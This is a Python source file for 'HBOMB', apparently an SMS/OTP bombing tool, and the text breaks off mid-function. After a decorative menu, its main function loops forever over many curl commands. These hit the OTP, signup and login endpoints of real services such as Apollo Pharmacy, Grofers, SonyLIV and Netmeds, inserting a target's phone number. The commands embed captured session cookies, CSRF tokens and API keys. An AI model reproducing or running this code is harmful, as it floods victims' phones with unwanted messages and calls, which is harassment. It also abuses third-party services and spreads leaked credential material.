'''
Developer: @aarinstech
Date: 06-10-2021
Update: 18-04-2022
77(-1) API used
'''

name="HBOMB"
version= "1.1.2"
import sys
import os
import time
import random
import math

class cl:
    white = "\033[1;37m"
    grey = "\033[0;37m"
    purple = "\033[0;35m"
    red = "\033[1;31m"
    green = "\033[1;32m"
    yellow = "\033[1;33m"
    cyan = "\033[0;36m"
    cafe = "\033[0;33m"
    blue = "\033[1;34m"

white=cl.white
grey=cl.grey
purple=cl.purple
red=cl.red
green=cl.green
yellow=cl.yellow
cyan=cl.cyan
cafe=cl.cafe
blue=cl.blue

def generateOTP() :
	digits = "0123456789"
	OTP = ""
	for i in range(6) :
		OTP += digits[math.floor(random.random() * 10)]
	return OTP
cotp=generateOTP()

listcol = (white, grey, purple, red, green, yellow, cyan, cafe, blue)
color = random.choice(listcol)

def clear():    
    if os.name == 'nt':
        sysos="cls"
    else:
        sysos="clear"
    os.system(sysos)

clear()
print(color+"\n")
print(color+"||=============||")
print(color+"|| Please Wait ||")
print(color+"||=============||")
print(color+"\n")
i=0
while i<5:
    sys.stdout.write(blue+'\rloading |')
    time.sleep(0.1)
    sys.stdout.write(red+'\rloading /')
    time.sleep(0.1)
    sys.stdout.write(yellow+'\rloading -')
    time.sleep(0.1)
    sys.stdout.write(green+'\rloading \\')
    time.sleep(0.1)
    i=i+1
clear()

def ascii():
    print(random.choice(listcol)+'''
     ╔╗░╔╗╔══╗░╔═══╗╔═╗╔═╗╔══╗░
     ║║░║║║╔╗║░║╔═╗║║║╚╝║║║╔╗║░
     ║╚═╝║║╚╝╚╗║║░║║║╔╗╔╗║║╚╝╚╗
     ║╔═╗║║╔═╗║║║░║║║║║║║║║╔═╗║
     ║║░║║║╚═╝║║╚═╝║║║║║║║║╚═╝║
     ╚╝░╚╝╚═══╝╚═══╝╚╝╚╝╚╝╚═══╝
    ''')
    print(red+       r"     Follow Me On Instagram : @aarinstech                                             ")
    print(purple+    r"     Follow Me On Twitter : @aarinstech                                               ") 
    print(grey+      r"     Follow Me On Github : https://github.com/aarinstech                              ")
    print(red+       r"     Subscribe To My Youtube Channel : aarinstech                                     ")
    print(random.choice(listcol)+"     Version  ",version)

print("\n")
print("     Welcome To",name)
print("\n")
time.sleep(3)
ascii()
print("\n")
print(yellow+  "            IMPORTANT :        ")
print(cyan+    "     For Human Verification    ")
print(blue+    "     Your OTP of 6 digits is : ", cotp)
print("\n")

def smsbom(target, color, messagesss):
    times = 0
    while True:
        try:
            os.popen(
                '''
                            curl -X POST -H "Host: www.fbbonline.in" -H "content-length: 435" -H "accept: application/json, text/javascript, */*; q=0.01" -H "x-newrelic-id: VQ8PVlFUChABV1ZRBgYCX1w=" -H "x-requested-with: XMLHttpRequest" -H "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36" -H "content-type: application/x-www-form-urlencoded; charset=UTF-8" -H "origin: https://www.fbbonline.in" -H "sec-fetch-site: same-origin" -H "sec-fetch-mode: cors" -H "sec-fetch-dest: empty" -H "referer: https://www.fbbonline.in/customer/account/checkoutcreate" -H "accept-encoding: gzip, deflate, br" -H "accept-language: en-US,en;q=0.9" -H "cookie: PHPSESSID=l79p1m44qqt2okvragufamej72" -H "cookie: _st_time=1601562961" -H "cookie: _fv=cmpnpp" -H "cookie: _fbp=fb.1.1601562989438.41952253" -H "cookie: activeCategories=s%3A12%3A%2240percentoff%22%3B" -H "cookie: activeFilters=s%3A27%3A%22%7B%22category%22%3A%2240percentoff%22%7D%22%3B" -H "cookie: rrUserId=8b9f6bf18b881409faee14f833956aca" -H "cookie: historyPlpPage=48" -H "cookie: scrollTopPosition=1" -H "cookie: historyProductCount=4"-H "cookie: historyProductSku=BU004TO76DQDINFUR" -H "cookie: historyPosition=1" -H "cookie: BU004TO76DQDINFUR_list=Polos" -H "cookie: pdSapSkus=s%3A155%3A%22%7B%22000001001496399001%22%3A%22XS%22%2C%22000001001496399002%22%3A%22S%22%2C%22000001001496399003%22%3A%22M%22%2C%22000001001496399004%22%3A%22L%22%2C%22000001001496399005%22%3A%22XL%22%2C%22000001001496399006%22%3A%22XXL%22%7D%22%3B" -H "cookie: recently_viewed_Sku=BU004TO76DQDINFUR" -H "cookie: all_store_details=null" -H "cookie: usr_crt=BU004TO76DQDINFUR-112646%3A1" -H "cookie: registration_url_cookie=https%3A%2F%2Fwww.fbbonline.in%2Fcustomer%2Faccount%2FcheckoutLogin" -d "YII_CSRF_TOKEN=5c5551174a88bdb2f2c2f2b02a492211701e0e8c&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D='''
            +target+
            '''&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=ezioaudi207%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=Cyber&RegistrationForm%5Blast_name%5D=Mafia&RegistrationForm%5Bpassword%5D=cybermafia123&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=" 'https://www.fbbonline.in/customer/account/GenerateOtp' > /dev/null 2>&1              
                            ''')
            times = times + 1
        except Exception as A:
            print("#1",A)
        try:
            os.popen(
                '''
                            curl --http2 -X POST -H "Host:www.apollopharmacy.in" -H "content-length:17" -H "accept:*/*" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 10; CPH1933) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "origin:https://www.apollopharmacy.in" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.apollopharmacy.in/sociallogin/mobile/login/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" -H "cookie:__cfduid=d98851bf93a8b640389d3448001b5a6361601659556" -H "cookie:PHPSESSID=5hi6on4q0uoomj7bhsl9846ce3" -H "cookie:_fbp=fb.1.1601659579198.1711590696" -H "cookie:__ta_device=vwcxwUYWQK6CjLE5qZfOO1jq1sIrSb1f" -H "cookie:__ta_visit=YsIgJNrxlThE7cK9qMyAAGRZdk6tswf7" -H "cookie:mage-translation-storage=%7B%7D" -H "cookie:mage-translation-file-version=%7B%7D" -H "cookie:__ta_ping=1" -H "cookie:mage-cache-storage=%7B%7D" -H "cookie:mage-cache-storage-section-invalidation=%7B%7D" -H "cookie:mage-cache-sessid=true" -H "cookie:mage-messages=" -H "cookie:section_data_ids=%7B%22customer%22%3A1601659380%2C%22compare-products%22%3A1601659380%2C%22last-ordered-items%22%3A1601659380%2C%22cart%22%3A1601660577%2C%22directory-data%22%3A1601659380%2C%22cadence-fbpixel-fpc%22%3A1601659380%2C%22review%22%3A1601659380%2C%22ammessages%22%3A1601659380%2C%22wishlist%22%3A1601659380%2C%22paypal-billing-agreement%22%3A1601659380%2C%22messages%22%3A1601660577%7D" -H "cookie:private_content_version=31193f5a756a200e2bcfd8a412d0f435" -H "cookie:AWSALB=ZCK07z5OGSQYuLfAHGqh467T00l+NIScVPXWs5s8f5hjvEoqawwouQiGidnvAY/lGoqzuyhC2+wATC4xbAy3u5VloSD8H7s8+7uXA3ecW3Ml7n49r1h36RUy2IrH" -H "cookie:AWSALBCORS=ZCK07z5OGSQYuLfAHGqh467T00l+NIScVPXWs5s8f5hjvEoqawwouQiGidnvAY/lGoqzuyhC2+wATC4xbAy3u5VloSD8H7s8+7uXA3ecW3Ml7n49r1h36RUy2IrH" -d "mobile='''
            +target+
            '''" "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#2",A)
        try:
            os.popen(
                '''
                            curl --http2 -X POST -H "Host:grofers.com" -H "content-length:21" -H "app_client:consumer_web" -H "lon:77.040489" -H "device_id:90938812-ddb5-4d18-987b-60793f0776f1" -H "lat:28.4465616" -H "content-type:application/x-www-form-urlencoded" -H "user-agent:Mozilla/5.0 (Linux; Android 10; CPH1933) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36" -H "auth_key:ca9d7b061dddb979562082a366c427610f53fe8ef500dadc80f8b0caf7a549fc" -H "accept:*/*" -H "origin:https://grofers.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://grofers.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" -H "cookie:__cfduid=d475e610ddc76074e6a50d5c6f91118df1601697005" -H "cookie:gr_1_deviceId=90938812-ddb5-4d18-987b-60793f0776f1" -H "cookie:city=" -H "cookie:__cfruid=f91298f1a33a801955b8d5466280379b9d26d7ea-1601697005" -H "cookie:gr_1_lat=28.4640810758775" -H "cookie:gr_1_lon=76.9942133969929" -H "cookie:gr_1_locality=1849" -H "cookie:ajs_anonymous_id=%22a58f3267-aae0-434d-be9c-ecdef450b407%22" -H "cookie:WZRK_S_RKR-99Z-ZK5Z=%7B%22p%22%3A1%7D" -d "user_phone='''
            +target+
            '''" "https://grofers.com/v2/accounts/" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#3",A)
        try:
            os.popen(
                '''
                            curl -X GET -H "Host:api.tjori.com" -H "Connection:keep-alive" -H "Accept:application/json, text/plain, */*" -H "User-Agent:Mozilla/5.0 (Linux; Android 10; CPH1933) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36" -H "Origin:https://www.tjori.com" -H "Sec-Fetch-Site:same-site" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://www.tjori.com/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9" "https://api.tjori.com/api/v2/otp/?number='''
            +target+
            '''&=&country_prefix=91" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#4",A)
        try:
            os.popen(
                '''
                            curl --http2 -X GET -H "Host:bcas-prod.byjusweb.com" -H "accept:*/*" -H "user-agent:Mozilla/5.0 (Linux; Android 10; CPH1933) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded" -H "origin:https://byjus.com" -H "sec-fetch-site:cross-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://byjus.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" "https://bcas-prod.byjusweb.com/api/voice?phoneNumber='''
            +target+
            '''&page=free-trial-classes" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#5",A)
        try:
            os.popen(
                '''
                            curl --http2 -X POST -H "Host:www.littledesire.com" -H "content-length:65" -H "accept:*/*" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 10; CPH1933) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "origin:https://www.littledesire.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.littledesire.com/register/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" -H "cookie:__cfduid=db74c31b26da130b3e8df98be42153e4e1601928025" -H "cookie:PHPSESSID=isn5mrmtjks6rpf4samabcrfg5" -H "cookie:cookie_litrecentproducts=1600" -H "cookie:coock_litcurrency=INR" -H "cookie:coock_litcurrency_symbol=Rs." -H "cookie:coock_litcurrency_value=1" -H "cookie:_fbp=fb.1.1601928038653.1116247862" -H "cookie:coock_litcountryid=1" -H "cookie:coock_litcountry=India" -H "cookie:coock_litcountry_flag=t1415095440b1415114765_India-Flag.png" -d "name=Cyber+mafia&mobile='''
            +target+
            '''&emailID=cybermafia%40gmail.com" "https://www.littledesire.com/register/sendotp.php" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#6",A)
        try:
            os.popen(
                '''
                            curl --http2 -X POST -H "Host:bcas-prod.byjusweb.com" -H "content-length:46" -H "accept:*/*" -H "user-agent:Mozilla/5.0 (Linux; Android 10; CPH1933) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded" -H "origin:https://byjus.com" -H "sec-fetch-site:cross-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://byjus.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" -d "phoneNumber='''
            +target+
            '''&page=free-trial-classes" "https://bcas-prod.byjusweb.com/api/send-otp" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#7",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:api.cloud.altbalaji.com" -H "Connection:keep-alive" -H "Content-Length:86" -H "Accept:application/json, text/plain, */*" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "X-API-KEY:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE" -H "Content-Type:application/json" -H "Origin:https://www.altbalaji.com" -H "Sec-Fetch-Site:same-site" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://www.altbalaji.com/user-detail?pid=NTU%3D" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -d '{"phone_number":"'''
                + target +
                '''","country_code":"91","platform":"web","exp":1601043289127}' "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#8",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:us-central1-vootdev.cloudfunctions.net" -H "content-length:59" -H "accept:application/json, text/plain, */*" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json;charset=UTF-8" -H "origin:https://www.voot.com" -H "sec-fetch-site:cross-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.voot.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d '{"type":"mobile","mobile":"'''
                + target +
                '''","countryCode":"+91"}' "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#9",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:apiv2.sonyliv.com" -H "content-length:111" -H "device_id:5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120" -H "security_token:eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJre11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "accept:application/json, text/plain, */*" -H "session_id:cc86326a51504133bacd3ce4f796e1cf-1600956156256" -H "x-via-device:true" -H "app_version:3.1.20" -H "origin:https://www.sonyliv.com" -H "sec-fetch-site:same-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d '{"channelPartnerID":"MSMIND","mobileNumber":"'''
                + target +
                '''","country":"IN","timestamp":"2020-09-24T14:03:03.505Z"}' "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#10",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:mobile.medplusindia.com" -H "content-length:238" -H "accept:application/json, text/plain, */*" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded" -H "origin:https://www.medplusmart.com" -H "sec-fetch-site:cross-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d 'recieveUpdates=1&firstName=Tsunami&lastName=Bomber&emailId=tsunami@gmail.com&password=U7d5iChk9ZWzrv%24&confirmpwd=U7d5iChk9ZWzrv%24&mobileNumber='''
                + target +
                '''&SESSIONID=17C83B4A90182E8DA6F4F15755A43027&isCordova=false&isPhonepeSwitch=false' "https://mobile.medplusindia.com/mobilemvc/profile/register.mbl" --output Logfile > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#11",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:webapi.apollo247.com" -H "Connection:keep-alive" -H "Content-Length:292" -H "accept:*/*" -H "Authorization:Bearer 3d1833da7020e0602165529446587434" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "Origin:https://www.apollo247.com" -H "Sec-Fetch-Site:same-site" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://www.apollo247.com/medicines?gclid=CjwKCAjwh7H7BRBBEiwAPXjadvKY3NSyNG-0yNkxp2qz2Jd5T0_zltNV3OnwoDFh3ECOsNImtyi1KxoCQY0QAvD_BwE" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -d '{"operationName":"Login","variables":{"mobileNumber":"+91'''
                + target +
                '''","loginType":"PATIENT"},"query":"query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\nstatus\nmessage\nloginId\n__typename\n  }\n}\n"}' "https://webapi.apollo247.com/" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#12",A)
        try:
            os.popen('''
                            curl -X GET -H "Host:m.netmeds.com" -H "accept:application/json, text/plain, */*" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://m.netmeds.com/customer/account/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:_gat_UA-63910444-1=1" -H "cookie:cto_bundle=SX3iw19aZ0xrcWZ0TFFXN1huJTJGJTJGbklkaDl5ZnM2UmxQeHhLNDhMb3dxQ2dTSUU1VSUyRkVnU0g0dG5UODVJTzNIbVNSMFJwR2hZQVpGeDJGYVBlVG5scUIlMkJCM3lCOXBlZ21jMm1HTzNwZXMlMkZxSWk4TEM3eXNUYXhjTFBKbUdqQWM2NFhBTWFHS09EUmJMaDRGUVVHVHVGcWxaR2tRJTNEJTNE" -H "cookie:liteprompt=disabled" -H "cookie:bsCoId=3600942736100" -H "cookie:_gat=1" -H "cookie:bsUl=0" -H "cookie:_gac_UA-63910444-1=1.1600942724.CjwKCAjwh7H7BRBBEiwAPXjadtM9O5MLH1ElhMO8FUbm9EprCPA4YXhxBk-XdN8ytuKetkzNGCI07xoCi1MQAvD_BwE" -H "cookie:_gac_UA-63910444-1=1.1600942724.CjwKCAjwh7H7BRBBEiwAPXjadtM9O5MLH1ElhMO8FUbm9EprCPA4YXhxBk-XdN8ytuKetkzNGCI07xoCi1MQAvD_BwE" -H "cookie:_gcl_aw=GCL.1600942724.CjwKCAjwh7H7BRBBEiwAPXjadtM9O5MLH1ElhMO8FUbm9EprCPA4YXhxBk-XdN8ytuKetkzNGCI07xoCi1MQAvD_BwE" -H "cookie:_we_wk_gls_ss_=N4IgfgjArAxgbABgEYwJYgFylQOwC4yYQA0IMAhjqgCYDOmA2uBAjElAOwIICcIAugF9BQAA" -H "cookie:_fbp=fb.1.1600942681371.1005200013" -H "cookie:_gid=GA1.3.195334206.1600942680" -H "cookie:_ga=GA1.3.1470493032.1600942680" -H "cookie:_ALGOLIA=anonymous-14e705f0-f47c-495b-bd5d-0cfefde9056b" -H "cookie:_gid=GA1.2.195334206.1600942680" -H "cookie:_ga=GA1.2.1470493032.1600942680" -H "cookie:_gcl_au=1.1.505450095.1600942677" "https://m.netmeds.com/mst/rest/v1/id/details/'''
                     + target + '''" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#13",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:getinstacash.in" -H "Connection:keep-alive" -H "Content-Length:30" -H "Accept:*/*" -H "X-Requested-With:XMLHttpRequest" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Origin:https://getinstacash.in" -H "Sec-Fetch-Site:same-origin" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://getinstacash.in/sell/login" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -H "Cookie:webInsta=rvg3l166pmfpeh6mi6auisshc7; G_ENABLED_IDPS=google; _ga=GA1.2.1994009459.1600927837; _gid=GA1.2.2093909779.1600927837; _gat_gtag_UA_46718346_7=1; __zlcmid=10LjSWRMCN11wY9" -d "type=sendOTP&mobile='''
                + target +
                '''" "https://getinstacash.in/sell/getData.php" > /dev/null 2>&1 '''
            )
            times = times + 1
        except Exception as A:
            print("#14",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:www.fbbonline.in" -H "content-length:432" -H "accept:application/json, text/javascript, */*; q=0.01" -H "x-newrelic-id:VQ8PVlFUChABV1ZRBgYCX1w=" -H "x-requested-with:XMLHttpRequest" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "origin:https://www.fbbonline.in" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.fbbonline.in/customer/account/create" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:historyPlpPage=0" -H "cookie:_gcl_au=1.1.282636412.1600839866" -H "cookie:_gat=1" -H "cookie:_gid=GA1.2.727597189.1600839866" -H "cookie:_ga=GA1.2.1662893346.1600839866" -H "cookie:all_store_details=null" -H "cookie:registration_url_cookie=https%3A%2F%2Fwww.fbbonline.in%2F" -H "cookie:_fbp=fb.1.1600839858758.1597042975" -H "cookie:_fv=cmpnpp" -H "cookie:_st_time=1600839856" -H "cookie:PHPSESSID=7id6ar9g0g6ou64f5fk2ur43o4" -d 'YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D='''
                + target +
                '''&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=tsunami%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=hdhdhd&RegistrationForm%5Blast_name%5D=bsbdb&RegistrationForm%5Bpassword%5D=hdhdbfbfv&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=' "https://www.fbbonline.in/customer/account/GenerateOtp" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#15",A)
        try:
            os.popen('''
                            curl -X POST -H "Host:grofers.com" -H "content-length:21" -H "lon:77.040489" -H "device_id:a11f656b-422e-4617-953b-c350d517467d" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "auth_key:57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13" -H "app_client:consumer_web" -H "lat:28.4465616" -H "content-type:application/x-www-form-urlencoded" -H "save-data:on" -H "accept:*/*" -H "origin:https://grofers.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://grofers.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:WZRK_S_RKR-99Z-ZK5Z=%7B%22p%22%3A1%2C%22s%22%3A1600811841%2C%22t%22%3A1600811851%7D" -H "cookie:_hjAbsoluteSessionInProgress=0" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:_fbp=fb.1.1600811840630.1070978807" -H "cookie:WZRK_G=3d3457db8a1a410a81f4d25f4519b4cb" -H "cookie:_hjid=c63646f5-26dc-4965-a368-890317b172cc" -H "cookie:__insp_norec_sess=true" -H "cookie:__insp_targlpt=T25saW5lIEdyb2NlcnkgU3RvcmU6IEJ1eSBPbmxpbmUgR3JvY2VyeSBmcm9tIEluZGlhJ3MgQmVzdCBPbmxpbmUgU3VwZXJtYXJrZXQgYXQgRGlzY291bnRlZCBSYXRlcyB8IEdyb2ZlcnM%3D" -H "cookie:__insp_targlpu=aHR0cHM6Ly9ncm9mZXJzLmNvbS8%3D" -H "cookie:__insp_nv=true" -H "cookie:__insp_slim=1600811839327" -H "cookie:__insp_wid=180455199" -H "cookie:_sp_id.bf41=5f26198d742a39cd.1600811837.1.1600811838.1600811837.9e446193-9dfb-425a-8d54-f3cb10911df1" -H "cookie:_sp_ses.bf41=*" -H "cookie:_gat_UA-85989319-1=1" -H "cookie:_gid=GA1.2.198360870.1600811837" -H "cookie:_ga=GA1.2.1673610786.1600811837" -H "cookie:_uetvid=34df67806c3d27bc1888eb83f66e00de" -H "cookie:_uetsid=4f1cecd087208f7fb10835de7cdc217a" -H "cookie:_gcl_au=1.1.339180193.1600811836" -H "cookie:ajs_anonymous_id=%226da8b09a-af2c-4502-b48e-e45d4d124170%22" -H "cookie:rl_user_id=%22%22" -H "cookie:rl_anonymous_id=%22b680edd5-0ce4-42aa-89a7-0029485ae882%22" -H "cookie:gr_1_locality=1849" -H "cookie:gr_1_lon=76.9942133969929" -H "cookie:gr_1_lat=28.4640810758775" -H "cookie:__cfruid=f2d685e3947486d019ac90c6e461185090599082-1600811832" -H "cookie:city=" -H "cookie:gr_1_deviceId=a11f656b-422e-4617-953b-c350d517467d" -H "cookie:__cfduid=d12d293cd955bb2c251771f7bdfd7a4f31600811832" -d 'user_phone='''
                     + target +
                     '''' "https://grofers.com/v2/accounts/" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#16",A)
        try:
            os.popen(
                '''
